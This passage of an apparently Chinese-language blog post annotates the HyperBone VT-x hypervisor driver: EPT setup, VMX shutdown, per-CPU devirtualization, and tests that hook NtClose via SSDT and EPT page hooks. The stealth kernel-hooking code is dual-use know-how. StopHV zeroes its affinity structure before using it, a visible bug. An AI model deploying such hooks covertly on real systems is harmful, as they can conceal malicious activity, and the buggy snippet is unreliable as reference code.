EPT_TABLE_POINTER EPTP = &#123; <span class="number">0</span> &#125;;<span class="comment">// EPT指针</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取相应寄存器的值</span></span><br><span class="line">    __vmx_vmread( SECONDARY_VM_EXEC_CONTROL, (<span class="type">size_t</span>*)&amp;secondary.All );</span><br><span class="line">    __vmx_vmread( CPU_BASED_VM_EXEC_CONTROL, (<span class="type">size_t</span>*)&amp;primary.All );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置EPTP（EPT表指针）的字段值。</span></span><br><span class="line">    <span class="comment">// 将EPTP的物理地址字段设置为PML4的物理地址（MmGetPhysicalAddress(PML4)），并将其右移12位（相当于除以4096），</span></span><br><span class="line">    <span class="comment">// 以获取正确的页帧号。将页表的长度设置为3，表示EPT有4级表（PML4、PDPT、PD和PT）。</span></span><br><span class="line">    EPTP.Fields.PhysAddr = <span class="built_in">MmGetPhysicalAddress</span>( PML4 ).QuadPart &gt;&gt; <span class="number">12</span>;</span><br><span class="line">    EPTP.Fields.PageWalkLength = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将EPTP的值写入EPT_POINTER VMCS字段中，以启用EPT。</span></span><br><span class="line">    __vmx_vmwrite( EPT_POINTER, EPTP.All );</span><br><span class="line">    <span class="comment">// 将虚拟处理器标识符（VPID）写入VMCS中，以启用VPID。</span></span><br><span class="line">    __vmx_vmwrite( VIRTUAL_PROCESSOR_ID, VM_VPID );</span><br><span class="line"></span><br><span class="line">    primary.Fields.ActivateSecondaryControl = TRUE;<span class="comment">// 激活二级CPU执行控制</span></span><br><span class="line">    secondary.Fields.EnableEPT = TRUE;<span class="comment">// 启用EPT</span></span><br><span class="line">    <span class="keyword">if</span>(g_Data-&gt;Features.VPID)</span><br><span class="line">        secondary.Fields.EnableVPID = TRUE;<span class="comment">// 启用VPID</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 将更新后的值写入VMCS中</span></span><br><span class="line">    __vmx_vmwrite( SECONDARY_VM_EXEC_CONTROL, secondary.All );</span><br><span class="line">    __vmx_vmwrite( CPU_BASED_VM_EXEC_CONTROL, primary.All );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 刷新EPT上下文，并从ctx拿到上下文信息</span></span><br><span class="line">    EPT_CTX ctx = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    __invept( INV_ALL_CONTEXTS, &amp;ctx );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//DPRINT( &quot;HyperBone: CPU %d: %s: EPT enabled\n&quot;, CPU_NUM, __FUNCTION__ );</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="刷新EPT上下文"><a href="#刷新EPT上下文" class="headerlink" title="刷新EPT上下文"></a>刷新EPT上下文</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__invept PROC</span><br><span class="line">    invept rcx, OWORD PTR [rdx]</span><br><span class="line">    ret</span><br><span class="line">__invept ENDP</span><br></pre></td></tr></table></figure><h3 id="AMD-CPU-不支持"><a href="#AMD-CPU-不支持" class="headerlink" title="AMD CPU 不支持"></a>AMD CPU 不支持</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">inline</span> VOID <span class="title">AMDSubvertCPU</span><span class="params">( IN PVCPU Vcpu, IN PVOID arg )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>( Vcpu );</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>( arg );</span><br><span class="line">    <span class="built_in">DPRINT</span>( <span class="string">&quot;HyperBone: CPU %d: %s: AMD-V not yet supported\n&quot;</span>, CPU_IDX, __FUNCTION__ );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="释放IntelCPU"><a href="#释放IntelCPU" class="headerlink" title="释放IntelCPU"></a>释放IntelCPU</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">inline</span> VOID <span class="title">IntelRestoreCPU</span><span class="params">( IN PVCPU Vcpu )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// Prevent execution of VMCALL on non-vmx CPU</span></span><br><span class="line">    <span class="keyword">if</span> (Vcpu-&gt;VmxState &gt; VMX_STATE_OFF)</span><br><span class="line">        <span class="built_in">VmxShutdown</span>( Vcpu );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="从根模式切换回非根模式"><a href="#从根模式切换回非根模式" class="headerlink" title="从根模式切换回非根模式"></a>从根模式切换回非根模式</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Revert CPU to non-root mode</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;Vcpu&quot;&gt;Virtual CPU data&lt;/param&gt;</span></span><br><span class="line"><span class="function">VOID <span class="title">VmxShutdown</span><span class="params">( IN PVCPU Vcpu )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//DPRINT( &quot;HyperBone: CPU %d: %s: CR3 load count %d\n&quot;, CPU_IDX, __FUNCTION__, Vcpu-&gt;Cr3Loads );</span></span><br><span class="line"></span><br><span class="line">    __vmx_vmcall( HYPERCALL_UNLOAD, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span> );<span class="comment">// 通知VMM卸载所加载的虚拟机</span></span><br><span class="line">    <span class="built_in">VmxVMCleanup</span>( KGDT64_R3_DATA | RPL_MASK, KGDT64_R3_CMTEB | RPL_MASK );<span class="comment">// 清除VMX相关设置</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放EPT的身份映射</span></span><br><span class="line">    <span class="built_in">EptFreeIdentityMap</span>( &amp;Vcpu-&gt;EPT );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放数据结构VMXON、VMCS和VMM堆栈内存</span></span><br><span class="line">    <span class="keyword">if</span> (Vcpu-&gt;VMXON)</span><br><span class="line">        <span class="built_in">MmFreeContiguousMemory</span>( Vcpu-&gt;VMXON );</span><br><span class="line">    <span class="keyword">if</span> (Vcpu-&gt;VMCS)</span><br><span class="line">        <span class="built_in">MmFreeContiguousMemory</span>( Vcpu-&gt;VMCS );</span><br><span class="line">    <span class="keyword">if</span> (Vcpu-&gt;VMMStack)</span><br><span class="line">        <span class="built_in">MmFreeContiguousMemory</span>( Vcpu-&gt;VMMStack );</span><br><span class="line"></span><br><span class="line">    Vcpu-&gt;VMXON = <span class="literal">NULL</span>;</span><br><span class="line">    Vcpu-&gt;VMCS = <span class="literal">NULL</span>;</span><br><span class="line">    Vcpu-&gt;VMMStack = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="通知VMM"><a href="#通知VMM" class="headerlink" title="通知VMM"></a>通知VMM</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__vmx_vmcall PROC</span><br><span class="line">    vmcall</span><br><span class="line">    ret</span><br><span class="line">__vmx_vmcall ENDP</span><br></pre></td></tr></table></figure><h5 id="清除VMX相关设置"><a href="#清除VMX相关设置" class="headerlink" title="清除VMX相关设置"></a>清除VMX相关设置</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">VmxVMCleanup PROC</span><br><span class="line">    mov     ds, cx              ; set DS to parameter 1</span><br><span class="line">    mov     es, cx              ; set ES to parameter 1</span><br><span class="line">    mov     fs, dx              ; set FS to parameter 2</span><br><span class="line">    ret                         ; return</span><br><span class="line">VmxVMCleanup ENDP</span><br></pre></td></tr></table></figure><h5 id="释放EPT的身份映射"><a href="#释放EPT的身份映射" class="headerlink" title="释放EPT的身份映射"></a>释放EPT的身份映射</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Release Guest to Host page mappings</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;pEPT&quot;&gt;CPU EPT data&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;Status code&lt;/returns&gt;</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">EptFreeIdentityMap</span><span class="params">( IN PEPT_DATA pEPT )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 检查PML4表是否为空</span></span><br><span class="line">    <span class="keyword">if</span> (pEPT-&gt;PML4Ptr == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放PML4表</span></span><br><span class="line">    pEPT-&gt;PML4Ptr = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">// 循环释放EPT页链表中每个表项的所有页面</span></span><br><span class="line">    <span class="keyword">while</span> (!<span class="built_in">IsListEmpty</span>( &amp;pEPT-&gt;PageList ))</span><br><span class="line">    &#123;</span><br><span class="line">        PLIST_ENTRY pListEntry = pEPT-&gt;PageList.Flink;</span><br><span class="line">        <span class="comment">// 获取列表入口的地址 从结构的成员指针得到结构的起始地址</span></span><br><span class="line">        PEPT_PAGES_ENTRY pEntry = <span class="built_in">CONTAINING_RECORD</span>( pListEntry, EPT_PAGES_ENTRY, link );</span><br><span class="line">        <span class="keyword">for</span> (ULONG i = <span class="number">0</span>; i &lt; pEntry-&gt;count; i++)</span><br><span class="line">            <span class="comment">// 释放表项的每个页面</span></span><br><span class="line">            <span class="keyword">if</span> (pEntry-&gt;pages[i] != <span class="literal">NULL</span>)</span><br><span class="line">                <span class="built_in">MmFreeContiguousMemory</span>( pEntry-&gt;pages[i] );</span><br><span class="line">        <span class="comment">// 移除当前表项，并释放内存空间</span></span><br><span class="line">        <span class="built_in">RemoveEntryList</span>( pListEntry );</span><br><span class="line">        <span class="built_in">ExFreePoolWithTag</span>( pListEntry, HB_POOL_TAG );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 表示释放了预分配的内存空间</span></span><br><span class="line">    pEPT-&gt;Preallocations = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="AMD不支持"><a href="#AMD不支持" class="headerlink" title="AMD不支持"></a>AMD不支持</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">inline</span> VOID <span class="title">AMDRestoreCPU</span><span class="params">( IN PVCPU Vcpu )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>( Vcpu );</span><br><span class="line">    <span class="built_in">DPRINT</span>( <span class="string">&quot;HyperBone: CPU %d: %s: AMD-V not yet supported\n&quot;</span>, CPU_IDX, __FUNCTION__ );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="停止虚拟化"><a href="#停止虚拟化" class="headerlink" title="停止虚拟化"></a>停止虚拟化</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Devirtualize each CPU</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;Status code&lt;/returns&gt;</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">StopHV</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// Unknown CPU</span></span><br><span class="line"><span class="keyword">if</span> (g_Data-&gt;CPUVendor == CPU_Other)</span><br><span class="line"><span class="keyword">return</span> STATUS_NOT_SUPPORTED;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    如果在当前的上下文中调用 KeGenericCallDpc 并将当前线程切换到另一个处理器上执行回调函数，可能会导致死锁。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    死锁是指两个或多个线程互相等待对方所持有的资源。在这种情况下，如果回调函数依赖于当前线程的某些资源，</span></span><br><span class="line"><span class="comment">    并且该资源在其他处理器上被另一个线程持有，那么当前线程会一直等待资源释放，从而导致死锁。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    为了避免潜在的死锁风险，作者决定屏蔽调用 KeGenericCallDpc 函数的代码，</span></span><br><span class="line"><span class="comment">    并采用其他方式来停止虚拟化的每个CPU。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="comment">// KeGenericCallDpc( HvmpHVCallbackDPC, NULL ); there will be Dead Lock</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取系统中活动处理器的数量，并循环依次处理每个处理器</span></span><br><span class="line">ULONG number_of_processors = <span class="built_in">KeQueryActiveProcessorCountEx</span>(ALL_PROCESSOR_GROUPS);</span><br><span class="line"><span class="keyword">for</span> (ULONG processor_index = <span class="number">0</span>; processor_index &lt; number_of_processors; processor_index++) &#123;</span><br><span class="line">PROCESSOR_NUMBER processor_number;</span><br><span class="line"><span class="built_in">RtlZeroMemory</span>(&amp;processor_number, <span class="built_in">sizeof</span>(PROCESSOR_NUMBER));</span><br><span class="line">        <span class="comment">// 获取当前处理器的PROCESSOR_NUMBER处理器编号结构体</span></span><br><span class="line">NTSTATUS status = <span class="built_in">KeGetProcessorNumberFromIndex</span>(processor_index, &amp;processor_number);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">DbgBreakPoint</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Switch the current processor</span></span><br><span class="line">GROUP_AFFINITY affinity;</span><br><span class="line"><span class="built_in">RtlZeroMemory</span>(&amp;affinity, <span class="built_in">sizeof</span>(GROUP_AFFINITY));</span><br><span class="line">        <span class="comment">// 表示将当前处理器作为目标处理器</span></span><br><span class="line">affinity.Group = processor_number.Group;</span><br><span class="line">affinity.Mask = <span class="number">1ull</span> &lt;&lt; processor_number.Number;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        系统组亲和性（System Group Affinity）是一种将线程限制在特定处理器组上运行的机制。</span></span><br><span class="line"><span class="comment">        在支持 NUMA（非统一内存访问）的系统中，处理器分为多个组，每个组具有自己的本地内存和其他资源。</span></span><br><span class="line"><span class="comment">        通过设置线程的系统组亲和性，可以使线程优先在特定的处理器组上运行，以提高性能和资源的局部性。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        KeSetSystemGroupAffinityThread 函数用于设置线程的系统组亲和性。它接受一个参数affinity，</span></span><br><span class="line"><span class="comment">        表示要设置的系统组亲和性信息。affinity 结构体中的字段包括 Mask 和 Group，</span></span><br><span class="line"><span class="comment">        分别表示处理器组掩码和组索引。通过调用该函数，可以将线程限制在指定的处理器组上运行。</span></span><br><span class="line"><span class="comment">        将原本的信息返回到previous_affinity</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        KeRevertToUserGroupAffinityThread 函数用于恢复线程的用户组亲和性。当线程的系统组亲和性被设置后，</span></span><br><span class="line"><span class="comment">        如果希望将其恢复为默认的用户组亲和性，则可以调用该函数。</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        GROUP_AFFINITY previous_affinity;</span><br><span class="line">        <span class="built_in">RtlZeroMemory</span>(&amp;affinity, <span class="built_in">sizeof</span>(GROUP_AFFINITY));</span><br><span class="line">        <span class="comment">// 将当前线程切换到目标处理器</span></span><br><span class="line"><span class="built_in">KeSetSystemGroupAffinityThread</span>(&amp;affinity, &amp;previous_affinity);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取指向当前处理器的指针，停止该处理器的虚拟化</span></span><br><span class="line">PVCPU pVCPU = &amp;g_Data-&gt;cpu_data[processor_index];</span><br><span class="line"><span class="built_in">IntelRestoreCPU</span>(pVCPU);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将当前线程切换回原来的处理器</span></span><br><span class="line"><span class="built_in">KeRevertToUserGroupAffinityThread</span>(&amp;previous_affinity);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">DbgBreakPoint</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="开始测试"><a href="#开始测试" class="headerlink" title="开始测试"></a>开始测试</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">TestStart</span><span class="params">( IN BOOLEAN SyscallHook, IN BOOLEAN PageHook1, IN IN BOOLEAN PageHook2 )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (PageHook1)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">TestPageHook</span>();<span class="comment">// 测试页面钩子</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 尝试获取 NtClose 系统调用函数的地址，并将其保存到全局变量 g_NtClose 中。</span></span><br><span class="line">    g_NtClose = (PVOID)<span class="built_in">UtilSSDTEntry</span>( <span class="built_in">SSDTIndex</span>( &amp;ZwClose ) );</span><br><span class="line">    <span class="keyword">if</span> (g_NtClose)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 如果获取到</span></span><br><span class="line">        <span class="keyword">if</span> (SyscallHook)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>( <span class="built_in">SHInitHook</span>() ))<span class="comment">// 系统调用入口钩子</span></span><br><span class="line">                <span class="built_in">SHHookSyscall</span>( <span class="built_in">SSDTIndex</span>( &amp;ZwClose ), (PVOID)hkNtClose, <span class="number">1</span> );<span class="comment">// 将系统调用函数的地址与自定义hkNtClose进行钩子绑定</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">DPRINT</span>( <span class="string">&quot;HyperBone: CPU %d: %s: SHInitHook() failed\n&quot;</span>, CPU_IDX, __FUNCTION__ );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (PageHook2)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (g_NtClose)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>( <span class="built_in">PHHook</span>( g_NtClose, (PVOID)hkNtClose2 ) ))<span class="comment">// 将全局系统调用函数的地址与自定义hkNtClose2进行钩子绑定</span></span><br><span class="line">                    <span class="built_in">DPRINT</span>( <span class="string">&quot;HyperBone: CPU %d: %s: PHHook() failed\n&quot;</span>, CPU_IDX, __FUNCTION__ );</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">DPRINT</span>( <span class="string">&quot;HyperBone: CPU %d: %s: NtClose not found\n&quot;</span>, CPU_IDX, __FUNCTION__ );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">DPRINT</span>( <span class="string">&quot;HyperBone: CPU %d: %s: NtClose not found\n&quot;</span>, CPU_IDX, __FUNCTION__ );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="测试页面钩子"><a href="#测试页面钩子" class="headerlink" title="测试页面钩子"></a>测试页面钩子</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">TestPageHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 缓冲区</span></span><br><span class="line">    UCHAR buf[<span class="number">32</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="comment">// TestFn函数地址</span></span><br><span class="line">    PVOID pFn = (PVOID)TestFn;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 复制函数地址前16字节到缓冲区，调用TestFn函数</span></span><br><span class="line">    <span class="built_in">RtlCopyMemory</span>( buf, pFn, <span class="number">16</span> );</span><br><span class="line">    <span class="built_in">DPRINT</span>( <span class="string">&quot;HyperBone: CPU %d: %s: Buffer contents: 0x%p, Call result 0x%X\n&quot;</span>, CPU_IDX, __FUNCTION__, *(PULONG64)buf, <span class="built_in">TestFn</span>( <span class="number">100</span>, <span class="number">5</span> ) );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将pFn地址与hkTestFn函数进行钩子绑定</span></span><br><span class="line">    <span class="built_in">PHHook</span>( pFn, (PVOID)hkTestFn );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 再次复制函数地址前16字节到缓冲区</span></span><br><span class="line">    <span class="comment">// 此时钩子生效，调用TestFn函数时，实际上调用的是hkTestFn函数</span></span><br><span class="line">    <span class="built_in">RtlCopyMemory</span>( buf, pFn, <span class="number">16</span> );</span><br><span class="line">    <span class="built_in">DPRINT</span>( <span class="string">&quot;HyperBone: CPU %d: %s: Buffer contents: 0x%p, Call result 0x%X\n&quot;</span>, CPU_IDX, __FUNCTION__, *(PULONG64)buf, <span class="built_in">TestFn</span>( <span class="number">100</span>, <span class="number">5</span> ) );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 恢复钩子</span></span><br><span class="line">    <span class="built_in">PHRestore</span>( pFn );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 再次复制函数地址前16字节到缓冲区，查看结果</span></span><br><span class="line">    <span class="built_in">RtlCopyMemory</span>( buf, pFn, <span class="number">16</span> );</span><br><span class="line">    <span class="built_in">DPRINT</span>( <span class="string">&quot;HyperBone: CPU %d: %s: Buffer contents: 0x%p, Call result 0x%X\n&quot;</span>, CPU_IDX, __FUNCTION__, *(PULONG64)buf, <span class="built_in">TestFn</span>( <span class="number">100</span>, <span class="number">5</span> ) );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="TestFn"><a href="#TestFn" class="headerlink" title="TestFn"></a>TestFn</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 指示放在.text0段中</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> alloc_text(<span class="string">&quot;.text0&quot;</span>, TestFn)</span></span><br><span class="line"><span class="function">ULONG64 <span class="title">TestFn</span><span class="params">( ULONG64 in1, ULONG64 in2 )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 对传入的参数进行一些数学运算</span></span><br><span class="line">    ULONG64 data1 = <span class="number">0x500</span>;</span><br><span class="line">    data1 += in1;</span><br><span class="line">    in2 -= <span class="number">0x10</span>;</span><br><span class="line">    <span class="keyword">return</span> in1 + in2 * <span class="number">3</span> - in1 / in2 + data1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="hkTestFn"><a href="#hkTestFn" class="headerlink" title="hkTestFn"></a>hkTestFn</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> alloc_text(<span class="string">&quot;.text1&quot;</span>, hkTestFn)</span></span><br><span class="line"><span class="function">ULONG64 <span class="title">hkTestFn</span><span class="params">( ULONG64 in1, ULONG64 in2 )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 获取 TestFn 函数的 hook entry</span></span><br><span class="line">    PPAGE_HOOK_ENTRY pEntry = <span class="built_in">PHGetHookEntry</span>( (PVOID)(ULONG_PTR)TestFn );</span><br><span class="line">    <span class="keyword">if</span> (pEntry)</span><br><span class="line">        <span class="comment">// 将其 OriginalData 字段转换为函数指针，并调用原始函数，传入参数 in1 和 